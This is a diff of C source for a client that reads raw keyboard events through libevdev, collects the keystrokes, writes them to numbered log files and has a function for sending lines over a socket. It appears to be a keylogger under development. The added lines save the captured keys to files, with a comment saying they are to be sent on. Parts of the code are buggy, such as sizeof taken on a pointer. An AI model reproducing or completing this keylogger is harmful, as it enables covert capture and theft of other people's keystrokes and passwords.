@@ -1,6 +1,8 @@
 #include "client.h"
 
 #include <errno.h>
+// the libevdev library has warnings for the variable names being too short
+// NOLINTNEXTLINE
 #include <libevdev/libevdev.h>
 #include <netinet/in.h>  // sockaddr_in
 #include <pthread.h>
@@ -157,8 +159,6 @@ int send_data(FILE* socket_file) {
   puts("Client sent line.");
   // printf("%i\n", fileno(socket_file));
 
-  fputs(send_line, socket_file);
-
   if (fputs(send_line, socket_file) == EOF) {
     free(send_line);
     error_and_exit("Couldn't send line.");
@@ -174,7 +174,7 @@ int send_data(FILE* socket_file) {
   return 0;
 }
 
-int serialize(FILE* socket_file, key_package* packet) {
+/* int serialize(FILE* socket_file, key_package* packet) {
   // Allocate memory for the serialized data
   size_t packet_size = sizeof(packet);
   char* serialized_data = malloc(packet_size);
@@ -191,11 +191,12 @@ int serialize(FILE* socket_file, key_package* packet) {
   free(serialized_data);
 
   return bytes_sent;
-}
+}*/
 
 void log_keys(key_package* package) {
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
-  int timer_counter = 20000000;
+  int timer_counter = 10000000;  // 200000000
+  int file_name_counter = 0;
 
   // open a device, as libevdev expects a file descriptor. You should have root
   // permissions
@@ -262,10 +263,23 @@ void log_keys(key_package* package) {
       counter = 0;
       // read and write and whee
 
-      print_logged_keys(*package);
+      // convert int to str
+      char str[20];
+      sprintf(str, "in_%d", file_name_counter);
+
+      char* file_name = strcat(str, ".txt");
+
+      FILE* package_log = fopen(file_name, "a");
+      if (package_log == NULL) {
+        error_and_exit("Couldn't open file");
+      }
+      keys_to_file(package_log, *package);
+      // call send data functoin on package_log
+
       if (package->keys_arr_size != 0) {
         reset_structs(package);
       }
+      ++file_name_counter;
     }
 
     if (ev.code == 107) {
